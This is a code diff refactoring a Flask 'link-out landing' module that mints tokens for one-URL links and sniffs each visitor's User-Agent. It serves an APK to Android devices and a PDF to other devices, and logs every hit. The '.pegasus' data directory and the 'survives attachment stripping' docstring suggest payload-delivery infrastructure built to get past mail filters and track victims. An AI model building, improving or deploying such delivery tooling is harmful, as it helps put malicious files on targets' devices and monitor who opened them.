@@ -1,26 +1,24 @@
-#!/usr/bin/env python3
-"""Link-out landing — one URL, UA-sniffed artifact, hit logging."""
-from __future__ import annotations
+"""UA-sniffing hop. Survives attachment stripping."""
 import json
 import pathlib
 import secrets
 import sqlite3
 import time
 
+from flask import abort, redirect, request
+
 DB = pathlib.Path.home() / ".pegasus" / "landing.db"
-
-UA_RULES = [
-    (("android",), "apk"),
-    (("iphone", "ipad", "ios"), "pdf"),
-    (("windows", "macintosh", "linux"), "pdf"),
-]
+RULES = [(("android",), "apk"), (("iphone", "ipad", "ios"), "pdf"),
+         (("windows", "macintosh", "linux"), "pdf")]
 
 
-def _db():
+def _db() -> sqlite3.Connection:
     DB.parent.mkdir(parents=True, exist_ok=True)
-    con = sqlite3.connect(DB)
-    con.execute("""CREATE TABLE IF NOT EXISTS links(
-        token TEXT PRIMARY KEY, artifacts TEXT, hits INTEGER DEFAULT 0, created REAL)""")
+    con = sqlite3.connect(DB, timeout=10)
+    con.execute("CREATE TABLE IF NOT EXISTS links(token TEXT PRIMARY KEY, artifacts TEXT,"
+                " hits INTEGER DEFAULT 0, created REAL)")
+    con.execute("CREATE TABLE IF NOT EXISTS hits(id INTEGER PRIMARY KEY, token TEXT,"
+                " ua TEXT, served TEXT, ts REAL)")
     return con
 
 
@@ -30,62 +28,43 @@ def mint(artifacts: dict) -> str:
     con.execute("INSERT INTO links(token, artifacts, created) VALUES(?,?,?)",
                 (token, json.dumps(artifacts), time.time()))
     con.commit()
-    con.close()
     return token
 
 
-def resolve(token: str):
+def pick(token: str) -> str | None:
     con = _db()
     row = con.execute("SELECT artifacts FROM links WHERE token=?", (token,)).fetchone()
     if not row:
-        con.close()
         return None
+    artifacts = json.loads(row[0])
+    ua = (request.headers.get("User-Agent") or "").lower()
+    chosen = next((artifacts[k] for needles, k in RULES
+                   if any(n in ua for n in needles) and artifacts.get(k)), None)
+    chosen = chosen or artifacts.get("pdf") or artifacts.get("apk") or artifacts.get("photo")
     con.execute("UPDATE links SET hits = hits + 1 WHERE token=?", (token,))
+    con.execute("INSERT INTO hits(token, ua, served, ts) VALUES(?,?,?,?)",
+                (token, ua[:300], chosen, time.time()))
     con.commit()
-    con.close()
-    return json.loads(row[0])
+    return chosen
 
 
-def pick(artifacts: dict, user_agent: str) -> str | None:
-    ua = (user_agent or "").lower()
-    for needles, kind in UA_RULES:
-        if any(n in ua for n in needles) and artifacts.get(kind):
-            return artifacts[kind]
-    return artifacts.get("pdf") or artifacts.get("apk") or artifacts.get("photo")
-
-
-def hits(token: str) -> dict:
+def stats(token: str) -> dict:
     con = _db()
-    row = con.execute("SELECT hits, created FROM links WHERE token=?", (token,)).fetchone()
-    con.close()
-    if not row:
-        return {"hits": 0}
-    return {"hits": row[0], "created": row[1]}
+    row = con.execute("SELECT hits FROM links WHERE token=?", (token,)).fetchone()
+    events = con.execute("SELECT ua, served, ts FROM hits WHERE token=? ORDER BY id",
+                         (token,)).fetchall()
+    return {"hits": row[0] if row else 0,
+            "events": [{"ua": e[0], "served": e[1], "ts": e[2]} for e in events]}
 
 
-def routes(app, ok, fail):  # noqa: A001
-    from flask import request, redirect
-
-    @app.post("/api/delivery/link")
-    def delivery_link():
-        body = request.get_json(silent=True) or {}
-        artifacts = body.get("artifacts") or {}
-        if not artifacts:
-            return fail("artifacts required")
-        token = mint(artifacts)
-        base = request.host_url.rstrip("/")
-        return ok({"token": token, "url": f"{base}/l/{token}"})
-
+def register(app, ok, fail):
     @app.get("/l/<token>")
-    def landing_redirect(token: str):
-        arts = resolve(token)
-        if arts is None:
-            return fail("unknown link", 404)
-        target = pick(arts, request.headers.get("User-Agent", ""))
+    def landing_hit(token):
+        target = pick(token)
         if not target:
-            return fail("no artifact for this client", 406)
-        return redirect(target, code=302)
+            abort(404)
+        return redirect(target)
 
-    @app.get("/api/delivery/link/<token>/hits")
-    def delivery_link_hits(token: str):
-        return ok(hits(token))
+    @app.get("/api/delivery/link/<token>")
+    def landing_stats(token):
+        return ok(stats(token))
